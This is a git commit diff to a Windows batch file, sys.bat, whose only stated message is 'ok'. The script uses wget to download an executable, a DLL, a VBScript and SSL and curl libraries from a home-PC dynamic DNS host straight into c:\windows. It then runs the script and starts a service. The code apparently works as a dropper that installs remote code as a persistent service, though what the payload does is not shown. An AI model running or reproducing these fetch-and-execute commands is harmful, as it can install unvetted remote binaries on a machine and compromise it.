233d236de2e4cb297ba26a2c176bf76ecbecdeea
pistacchietto <pistacchietto2@gmail.com>
2019-07-26 15:07:38 +0200

    ok

--- sys.bat
+++ sys.bat
@@ -1,9 +1,9 @@
-wget http://troglo.homepc.it/win/sys2.exe c:\windows\sys2.exe
-wget http://troglo.homepc.it/win/sys2.dll c:\windows\sys2.dll
-wget http://troglo.homepc.it/win/sys2.vbs c:\windows\sys2.vbs
-wget http://troglo.homepc.it/win/libssl-1_1.dll c:\windows\libssl-1_1.dll
-wget http://troglo.homepc.it/win/libcurl.dll c:\windows\libcurl.dll
-wget http://troglo.homepc.it/win/libcrypto-1_1.dll c:\windows\libcrypto-1_1.dll
+wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
+wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\sys2.dll
+wget http://troglo.homepc.it/win/sys2.vbs -O c:\windows\sys2.vbs
+wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
+wget http://troglo.homepc.it/win/libcurl.dll -O c:\windows\libcurl.dll
+wget http://troglo.homepc.it/win/libcrypto-1_1.dll -O c:\windows\libcrypto-1_1.dll
 cscript c:\windows\sys2.vbs
 net start CppWindowsService
  
